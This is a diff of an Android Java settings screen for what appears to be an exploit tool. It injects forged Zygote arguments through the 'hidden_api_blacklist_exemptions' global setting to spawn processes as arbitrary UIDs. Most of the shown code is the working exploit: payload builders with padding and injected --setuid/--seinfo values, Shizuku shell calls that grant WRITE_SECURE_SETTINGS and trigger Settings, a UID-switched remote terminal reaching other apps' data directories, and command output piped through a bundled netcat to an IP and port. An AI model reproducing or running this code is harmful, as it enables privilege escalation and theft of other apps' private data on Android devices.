@@ -64,7 +64,7 @@ public class ZygoteFragment extends PreferenceFragmentCompat
 
     private static final String TAG = "ZygoteFragment";
 
-    
+
     private static final String KEY_STATUS = "runtime_status";
     private static final String KEY_LOGS = "log_output";
     private static final String KEY_COMMAND_INPUT = "command_input";
@@ -73,6 +73,8 @@ public class ZygoteFragment extends PreferenceFragmentCompat
     private static final String KEY_START = "start_server";
     private static final String KEY_STOP = "stop_server";
     private static final String KEY_EXEC = "execute_btn";
+    private static final String KEY_SHIZUKU_1000 = "run_shizuku_btn";
+    private static final String KEY_LIB_SHIZUKU_PATH = "lib_shizuku_path";
     private static final String KEY_TERMINAL = "terminal";
     private static final String KEY_TOP_DATA = "top_data";
     private static final String KEY_ADVANCED_CATEGORY = "advanced_category";
@@ -82,7 +84,7 @@ public class ZygoteFragment extends PreferenceFragmentCompat
     private static final String KEY_APP_SELECTOR = "app_selector";
     private static final String KEY_MULTI_SELECT = "multi_select_preference";
 
-    
+
     private static final String DEFAULT_IP = "0.0.0.0";
     private static final int DEFAULT_PORT = 9981;
     private static final int DEFAULT_ZYG1 = 5;
@@ -90,12 +92,9 @@ public class ZygoteFragment extends PreferenceFragmentCompat
     private static final int DEFAULT_ZYG3 = 4;
     private static final String INITIAL_LOG_TEXT = "No logs";
 
-    
-    private static final String EASTER_EGG_LOWER = "hello dream";
-    private static final String EASTER_EGG_UPPER = "HELLO DREAM";
 
-    
     private EditTextPreference commandInputPref;
+    private EditTextPreference libShizukuPath;
     private EditTextPreference ipAddressPref;
     private EditTextPreference portPref;
     private EditTextPreference setuidInputPref;
@@ -110,7 +109,7 @@ public class ZygoteFragment extends PreferenceFragmentCompat
     private PreferenceCategory advancedCategory;
     private Preference advancedTrigger;
 
-    
+
     private ExecutorService executor;
     private ServerThread serverThread;
     private final Handler handler = new Handler(Looper.getMainLooper());
@@ -118,30 +117,69 @@ public class ZygoteFragment extends PreferenceFragmentCompat
     private boolean isFirstLog = true;
     private volatile String lastReceivedMessage;
 
-    
-    private enum ValueType {
-        DIGITS,     
-        NON_SPACE   
-    }
 
-    
+    private enum ValueType {
+        DIGITS,
+        NON_SPACE
+    }
 
     @Override
     public void onCreatePreferences(Bundle savedInstanceState, String rootKey) {
         setPreferencesFromResource(R.xml.root_preference, rootKey);
+        // Находим наш элемент настройки по ключу
+        androidx.preference.EditTextPreference shizukuPref = findPreference("lib_shizuku_path");
+        if (shizukuPref != null) {
+            // Получаем текущее значение из SharedPreferences
+            String currentPath = shizukuPref.getText();
+
+            // Если в настройках почему-то пусто, берем путь по умолчанию напрямую
+            if (currentPath == null || currentPath.isEmpty()) {
+                android.content.Context context = getContext();
+                if (context != null) {
+                    try {
+                        PackageManager pm = requireContext().getPackageManager();
+                        ApplicationInfo shizukuAppInfo = pm.getApplicationInfo("moe.shizuku.privileged.api", 0);
+
+                        // Формируем путь к оригинальному файлу libshizuku.so
+                        currentPath = shizukuAppInfo.nativeLibraryDir + "/libshizuku.so";
+
+                        // Сохраняем полученный путь в настройки
+                        shizukuPref.setText(currentPath);
+
+                    } catch (PackageManager.NameNotFoundException e) {
+                        // Этот блок сработает, если приложение Shizuku не установлено на телефоне
+                        android.util.Log.e("Deployer", "Приложение Shizuku не найдено в системе!");
+                        currentPath = "Shizuku не установлен!";
+                    }
+                    // Сразу сохраняем его в память, чтобы исправить пустую ячейку
+                    shizukuPref.setText(currentPath);
+                }
+            }
+
+            // Устанавливаем текст пути в подзаголовок (summary)
+            shizukuPref.setSummary(currentPath);
+
+            // Добавляем слушатель, чтобы при ручном изменении пути пользователем,
+            // подзаголовок (summary) тоже мгновенно обновлялся на экране
+            shizukuPref.setOnPreferenceChangeListener((preference, newValue) -> {
+                preference.setSummary(newValue.toString());
+                return true;
+            });
+        }
+
         initPreferences();
     }
 
     @Override
     public void onDestroy() {
-        
+
         handler.removeCallbacksAndMessages(null);
         stopServer();
         shutdownExecutor();
         super.onDestroy();
     }
 
-    
+
 
     private void initPreferences() {
         disableMiuiOptimization();
@@ -171,6 +209,7 @@ public class ZygoteFragment extends PreferenceFragmentCompat
 
     private void bindPreferences() {
         commandInputPref = findPreference(KEY_COMMAND_INPUT);
+        libShizukuPath = findPreference(KEY_LIB_SHIZUKU_PATH);
         ipAddressPref = findPreference(KEY_IP);
         portPref = findPreference(KEY_PORT);
         setuidInputPref = findPreference("setuid_input");
@@ -189,15 +228,16 @@ public class ZygoteFragment extends PreferenceFragmentCompat
     private void setupListeners() {
         setPreferenceChangeListener(KEY_IP, this);
         setPreferenceChangeListener(KEY_PORT, this);
-        
+
         setPreferenceClickListener(KEY_START, this);
         setPreferenceClickListener(KEY_STOP, this);
         setPreferenceClickListener(KEY_EXEC, this);
+        setPreferenceClickListener(KEY_SHIZUKU_1000, this);
         setPreferenceClickListener(KEY_TERMINAL, this);
         setPreferenceClickListener(KEY_TOP_DATA, this);
         setPreferenceClickListener(KEY_APP_SELECTOR, this);
 
-        
+
         if (advancedTrigger != null) {
             advancedTrigger.setOnPreferenceClickListener(pref -> {
                 toggleAdvancedSettings();
@@ -205,7 +245,7 @@ public class ZygoteFragment extends PreferenceFragmentCompat
             });
         }
 
-        
+
         Preference shellPref = findPreference(KEY_SHELL_TERMINAL);
         if (shellPref != null) {
             shellPref.setOnPreferenceClickListener(pref -> {
@@ -214,18 +254,18 @@ public class ZygoteFragment extends PreferenceFragmentCompat
             });
         }
 
-        
+
         Preference android12Info = findPreference(KEY_ANDROID12_INFO);
         if (android12Info != null) {
             android12Info.setOnPreferenceClickListener(pref -> {
-                MaterialDialogHelper.showSimpleDialog(getActivity(), 
-                    getString(R.string.warning), 
+                MaterialDialogHelper.showSimpleDialog(getActivity(),
+                    getString(R.string.warning),
                     getString(R.string.android12_warn));
                 return true;
             });
         }
 
-        
+
         MultiSelectListPreference multiSelectPref = findPreference(KEY_MULTI_SELECT);
         if (multiSelectPref != null) {
             multiSelectPref.setOnPreferenceChangeListener((pref, newValue) -> true);
@@ -247,7 +287,7 @@ public class ZygoteFragment extends PreferenceFragmentCompat
         setPreferenceEnabled(KEY_STOP, false);
     }
 
-    
+
 
     @Override
     public boolean onPreferenceChange(@NonNull Preference preference, Object newValue) {
@@ -275,6 +315,9 @@ public class ZygoteFragment extends PreferenceFragmentCompat
             case KEY_EXEC:
                 handleExecuteClick();
                 return true;
+            case KEY_SHIZUKU_1000:
+                runShizuku();
+                return true;
             case KEY_TERMINAL:
                 openTerminalActivity();
                 return true;
@@ -288,8 +331,6 @@ public class ZygoteFragment extends PreferenceFragmentCompat
                 return false;
         }
     }
-
-    
 
     private boolean handleIpChange(String ip) {
         if (!isValidIp(ip)) {
@@ -318,13 +359,20 @@ public class ZygoteFragment extends PreferenceFragmentCompat
     private void handleExecuteClick() {
         String command = getPreferenceText(commandInputPref);
 
-        
-        if (EASTER_EGG_LOWER.equalsIgnoreCase(command)) {
-            openHelloDreamActivity();
+        if (!validateInputs()) {
             return;
         }
 
-        
+        String payload = buildExecutePayload(command);
+        if (payload != null) {
+            runPayload(payload);
+            showSnackbar(getString(R.string.payload_sign));
+        }
+    }
+
+    private void runShizuku() {
+        String command = getPreferenceText(libShizukuPath);
+
         if (!validateInputs()) {
             return;
         }
@@ -338,13 +386,13 @@ public class ZygoteFragment extends PreferenceFragmentCompat
 
     private void handleShellTerminalClick() {
         String uidStr = getPreferenceText(setuidInputPref);
-        
+
         MaterialDialogHelper.showConfirmDialog(getActivity(),
             getString(R.string.create_remote),
             String.format(getString(R.string.create_msg), uidStr),
             (dialog, which) -> {
                 if (!validateInputs()) return;
-                
+
                 String payload = buildShellPayload(uidStr);
                 if (payload != null) {
                     runPayload(payload);
@@ -399,9 +447,9 @@ public class ZygoteFragment extends PreferenceFragmentCompat
         builder.create().show();
     }
 
-    
 
-    
+
+
     @Nullable
     private String buildExecutePayload(String command) {
         String sanitizedCommand = sanitizeShellCommand(command);
@@ -415,19 +463,19 @@ public class ZygoteFragment extends PreferenceFragmentCompat
         }
 
         if (isAndroid12To13()) {
-            return basePayload + 
-                "/system/bin/logwrapper echo zYg0te $(" + sanitizedCommand + 
-                " | " + nativeLibDir + "/libzygote_nc.so " + ip + " " + port + ")" + 
+            return basePayload +
+                "/system/bin/logwrapper echo zYg0te $(" + sanitizedCommand +
+                " | " + nativeLibDir + "/libzygote_nc.so " + ip + " " + port + ")" +
                 getPayloadBuffer();
         } else {
-            return basePayload + 
-                "echo \"$(" + sanitizedCommand + ")\" | " + 
-                nativeLibDir + "/libzygote_nc.so " + ip + " " + port + ";" + 
+            return basePayload +
+                "echo \"$(" + sanitizedCommand + ")\" | " +
+                nativeLibDir + "/libzygote_nc.so " + ip + " " + port + ";" +
                 getPayloadBuffer();
         }
     }
 
-    
+
     @Nullable
     private String buildShellPayload(String uidStr) {
         String basePayload = getBasePayload();
@@ -438,18 +486,18 @@ public class ZygoteFragment extends PreferenceFragmentCompat
         }
 
         if (isAndroid12To13()) {
-            return basePayload + 
-                "/system/bin/logwrapper echo zYg0te $(/system/bin/setsid " + 
-                nativeLibDir + "/libzygote_term.so " + uidStr + ")" + 
+            return basePayload +
+                "/system/bin/logwrapper echo zYg0te $(/system/bin/setsid " +
+                nativeLibDir + "/libzygote_term.so " + uidStr + ")" +
                 getPayloadBuffer();
         } else {
-            return basePayload + 
-                "echo $(setsid " + nativeLibDir + "/libzygote_term.so " + uidStr + ");" + 
+            return basePayload +
+                "echo $(setsid " + nativeLibDir + "/libzygote_term.so " + uidStr + ");" +
                 getPayloadBuffer();
         }
     }
 
-    
+
     @Nullable
     private String buildAppDataPayload(int uid, String packageName) {
         String basePayload = getBasePayload();
@@ -462,29 +510,29 @@ public class ZygoteFragment extends PreferenceFragmentCompat
         String appDir = "/data/data/" + sanitizePackageName(packageName) + ":56423";
 
         if (isAndroid12To13()) {
-            return basePayload + 
-                "/system/bin/logwrapper echo zYg0te $(/system/bin/setsid " + 
-                nativeLibDir + "/libzygote_term.so " + uid + " --app-dir=" + appDir + ")" + 
+            return basePayload +
+                "/system/bin/logwrapper echo zYg0te $(/system/bin/setsid " +
+                nativeLibDir + "/libzygote_term.so " + uid + " --app-dir=" + appDir + ")" +
                 getPayloadBuffer();
         } else {
-            return basePayload + 
-                "echo $(setsid " + nativeLibDir + "/libzygote_term.so " + uid + 
-                " --app-dir=" + appDir + ");" + 
+            return basePayload +
+                "echo $(setsid " + nativeLibDir + "/libzygote_term.so " + uid +
+                " --app-dir=" + appDir + ");" +
                 getPayloadBuffer();
         }
     }
 
-    
+
     @Nullable
     private String getBasePayload() {
         try {
             String rawPayload = generateRawPayload();
-            
+
             String uid = getPreferenceText(setuidInputPref);
             String gid = getPreferenceText(setgidInputPref);
             String selinux = getPreferenceText(selinuxInputPref);
             String niceName = getPreferenceText(niceNameInputPref);
-            String runtimeFlags = runtimeFlagsListPref != null ? 
+            String runtimeFlags = runtimeFlagsListPref != null ?
                 runtimeFlagsListPref.getValue() : "0";
 
             return replaceAllParameters(rawPayload, uid, gid, selinux, niceName, runtimeFlags);
@@ -495,7 +543,7 @@ public class ZygoteFragment extends PreferenceFragmentCompat
         }
     }
 
-    
+
     private String generateRawPayload() {
         int zyg1Count = DEFAULT_ZYG1;
         int zyg2Count = DEFAULT_ZYG2;
@@ -507,19 +555,19 @@ public class ZygoteFragment extends PreferenceFragmentCompat
 
         StringBuilder payload = new StringBuilder();
 
-        
+
         for (int i = 0; i < zyg1Count; i++) {
             payload.append("\n");
         }
 
-        
+
         char[] padding = new char[zyg2Count];
         Arrays.fill(padding, 'A');
         payload.append(padding);
 
-        
+
         String niceName = getPreferenceText(niceNameInputPref);
-        String runtimeFlags = runtimeFlagsListPref != null ? 
+        String runtimeFlags = runtimeFlagsListPref != null ?
             runtimeFlagsListPref.getValue() : "0";
 
         payload.append(ZygoteArguments.CALCULATE)
@@ -533,13 +581,13 @@ public class ZygoteFragment extends PreferenceFragmentCompat
 
         String result = payload.toString();
 
-        
+
         Context context = getActivity();
         if (context != null) {
             String[] extraParams = getMultiSelectedTexts(context, KEY_MULTI_SELECT);
             result = insertParamsAfter(result, "--runtime-args", extraParams);
 
-            
+
             String groups = getPreferenceText(setgroupInputPref);
             if (!groups.isEmpty()) {
                 String[] groupParam = {"--setgroups=" + sanitizeNumericList(groups)};
@@ -550,7 +598,7 @@ public class ZygoteFragment extends PreferenceFragmentCompat
         return result;
     }
 
-    
+
     private String getPayloadBuffer() {
         int count = DEFAULT_ZYG3;
         if (Build.VERSION.SDK_INT > Build.VERSION_CODES.R) {
@@ -562,14 +610,14 @@ public class ZygoteFragment extends PreferenceFragmentCompat
         return " #" + new String(commas) + "X";
     }
 
-    
 
-    
-    public static String replaceAllParameters(String originalText, 
-                                               String newUid, 
+
+
+    public static String replaceAllParameters(String originalText,
+                                               String newUid,
                                                String newGid,
-                                               String newSelinux, 
-                                               String newNiceName, 
+                                               String newSelinux,
+                                               String newNiceName,
                                                String newRuntimeFlags) {
         if (originalText == null) {
             return null;
@@ -585,7 +633,7 @@ public class ZygoteFragment extends PreferenceFragmentCompat
             result = replaceParameter(result, "--setgid=", newGid, ValueType.DIGITS);
         }
 
-        
+
         if (newSelinux != null && !newSelinux.isEmpty()) {
             result = replaceParameter(result, "--seinfo=", newSelinux, ValueType.NON_SPACE);
         }
@@ -601,8 +649,8 @@ public class ZygoteFragment extends PreferenceFragmentCompat
         return result;
     }
 
-    
-    private static String replaceParameter(String text, String paramName, 
+
+    private static String replaceParameter(String text, String paramName,
                                            String newValue, ValueType type) {
         StringBuilder result = new StringBuilder();
         int lastIndex = 0;
@@ -627,13 +675,13 @@ public class ZygoteFragment extends PreferenceFragmentCompat
         return result.toString();
     }
 
-    
+
     private static int findValueEnd(String text, int start, ValueType type) {
         int end = start;
         while (end < text.length()) {
             char c = text.charAt(end);
             boolean shouldContinue;
-            
+
             switch (type) {
                 case DIGITS:
                     shouldContinue = Character.isDigit(c);
@@ -644,14 +692,14 @@ public class ZygoteFragment extends PreferenceFragmentCompat
                 default:
                     shouldContinue = false;
             }
-            
+
             if (!shouldContinue) break;
             end++;
         }
         return end;
     }
 
-    
+
     private static int findExactParameter(String text, String param, int fromIndex) {
         int index = fromIndex;
         while (index < text.length()) {
@@ -666,9 +714,9 @@ public class ZygoteFragment extends PreferenceFragmentCompat
         return -1;
     }
 
-    
+
     private static boolean isExactParameterMatch(String text, int index, String param) {
-        
+
         if (index > 0) {
             char prev = text.charAt(index - 1);
             if (!Character.isWhitespace(prev)) {
@@ -676,19 +724,19 @@ public class ZygoteFragment extends PreferenceFragmentCompat
             }
         }
 
-        
+
         return index + param.length() <= text.length() &&
                text.substring(index, index + param.length()).equals(param);
     }
 
-   
+
 public String insertParamsAfter(String originalText, String anchorParam, String[] newParams) {
     if (originalText == null || originalText.isEmpty() ||
         newParams == null || newParams.length == 0) {
         return originalText;
     }
 
-    
+
     Pattern countPattern = Pattern.compile("(\\d+)");
     Matcher matcher = countPattern.matcher(originalText);
 
@@ -697,8 +745,8 @@ public String insertParamsAfter(String originalText, String anchorParam, String[
         try {
             int currentCount = Integer.parseInt(matcher.group(1));
             int newCount = currentCount + newParams.length;
-            
-            
+
+
             StringBuilder sb = new StringBuilder(originalText);
             sb.replace(matcher.start(), matcher.end(), String.valueOf(newCount));
             updatedText = sb.toString();
@@ -737,9 +785,9 @@ public String insertParamsAfter(String originalText, String anchorParam, String[
 
     return result.toString();
 }
-    
 
-    
+
+
     private boolean validateInputs() {
         String uid = getPreferenceText(setuidInputPref);
         if (!isValidNumeric(uid)) {
@@ -756,7 +804,7 @@ public String insertParamsAfter(String originalText, String anchorParam, String[
         return true;
     }
 
-    
+
     private boolean isValidNumeric(String value) {
         if (value == null || value.isEmpty()) {
             return false;
@@ -764,7 +812,7 @@ public String insertParamsAfter(String originalText, String anchorParam, String[
         return value.matches("^\\d+$");
     }
 
-    
+
     private boolean isValidIp(String ip) {
         if (ip == null) return false;
         if ("0.0.0.0".equals(ip)) return true;
@@ -779,21 +827,21 @@ public String insertParamsAfter(String originalText, String anchorParam, String[
         return input;
     }
 
-    
+
     private String sanitizePackageName(String packageName) {
         if (packageName == null) return "";
-        
+
         return packageName.replaceAll("[^a-zA-Z0-9._]", "");
     }
 
-    
+
     private String sanitizeNumericList(String input) {
         if (input == null) return "";
-        
+
         return input.replaceAll("[^0-9,]", "");
     }
 
-    
+
 
     private void startServer() {
         if (serverThread == null) {
@@ -826,7 +874,7 @@ public String insertParamsAfter(String originalText, String anchorParam, String[
         }
     }
 
-    
+
     private class ServerThread extends Thread {
         private ServerSocket serverSocket;
         private volatile boolean isRunning = true;
@@ -890,7 +938,7 @@ public String insertParamsAfter(String originalText, String anchorParam, String[
         }
     }
 
-    
+
     private class ClientHandler extends Thread {
         private final Socket clientSocket;
         private final String clientIp;
@@ -927,9 +975,9 @@ public String insertParamsAfter(String originalText, String anchorParam, String[
         }
     }
 
-    
 
-    
+
+
     public void runPayload(String payload) {
         Context context = getActivity();
         if (context == null) {
@@ -937,15 +985,15 @@ public String insertParamsAfter(String originalText, String anchorParam, String[
             return;
         }
 
-        
+
         ShizukuExec("pm grant com.wqry085.deployesystem android.permission.WRITE_SECURE_SETTINGS");
         ShizukuExec("am force-stop com.android.settings");
 
-        
-        ShizukuExec("echo '" + escapeForShell(payload) + "' > /data/local/tmp/" + 
+
+        ShizukuExec("echo '" + escapeForShell(payload) + "' > /data/local/tmp/" +
             getString(R.string.config_file));
 
-        
+
         ContentValues values = new ContentValues();
         values.put(Settings.Global.NAME, "hidden_api_blacklist_exemptions");
         values.put(Settings.Global.VALUE, payload);
@@ -960,10 +1008,10 @@ public String insertParamsAfter(String originalText, String anchorParam, String[
             return;
         }
 
-        
+
         ShizukuExec("am start -n com.android.settings/.Settings");
 
-        
+
         handler.postDelayed(() -> {
     ContentValues resetValues = new ContentValues();
     resetValues.put(Settings.Global.NAME, "hidden_api_blacklist_exemptions");
@@ -978,18 +1026,18 @@ public String insertParamsAfter(String originalText, String anchorParam, String[
 }, 200);
     }
 
-    
+
     private String escapeForShell(String input) {
         if (input == null) return "";
         return input.replace("'", "'\\''");
     }
 
-    
+
     public static String ShizukuExec(String cmd) {
         StringBuilder output = new StringBuilder();
         try {
             Process p = Shizuku.newProcess(new String[]{"sh"}, null, null);
-            
+
             try (OutputStream out = p.getOutputStream()) {
                 out.write((cmd + "\nexit\n").getBytes(StandardCharsets.UTF_8));
                 out.flush();
@@ -1023,7 +1071,7 @@ public String insertParamsAfter(String originalText, String anchorParam, String[
         }
     }
 
-    
+
 
     private boolean isAndroid12To13() {
         int sdk = Build.VERSION.SDK_INT;
@@ -1135,7 +1183,7 @@ public String insertParamsAfter(String originalText, String anchorParam, String[
         }
     }
 
-    
+
 
     public static int getUidByPackageName(Context context, String packageName) {
         if (context == null || packageName == null || packageName.isEmpty()) {
@@ -1193,7 +1241,7 @@ public String insertParamsAfter(String originalText, String anchorParam, String[
         return selectedTexts.toArray(new String[0]);
     }
 
-    
+
 
     private void disableMiuiOptimization() {
         Context context = getActivity();
@@ -1222,7 +1270,7 @@ public String insertParamsAfter(String originalText, String anchorParam, String[
         }
     }
 
-    
+
 
     private void openTerminalActivity() {
         Context context = getActivity();
@@ -1232,37 +1280,28 @@ public String insertParamsAfter(String originalText, String anchorParam, String[
         }
     }
 
-    private void openHelloDreamActivity() {
-        Context context = getActivity();
-        if (context != null) {
-            Intent intent = new Intent(context, hellodream.class);
-            startActivity(intent);
-            getActivity().finish();
-        }
-    }
-
     private void showAppSelectorBottomSheet() {
     AppSelectorBottomSheet bottomSheet = new AppSelectorBottomSheet();
     bottomSheet.setOnAppSelectedListener((packageName, appName) -> {
-        
+
         int uid = getUidByPackageName(requireContext(), packageName);
-        
+
         if (uid == -1) {
             showToast(getString(R.string.app_not_found));
             return;
         }
-        
+
         String uidStr = String.valueOf(uid);
-        
-        
+
+
         if (setuidInputPref != null) {
             setuidInputPref.setText(uidStr);
         }
         if (setgidInputPref != null) {
             setgidInputPref.setText(uidStr);
         }
-        
-        
+
+
     });
     bottomSheet.show(getParentFragmentManager(), "app_selector");
 }
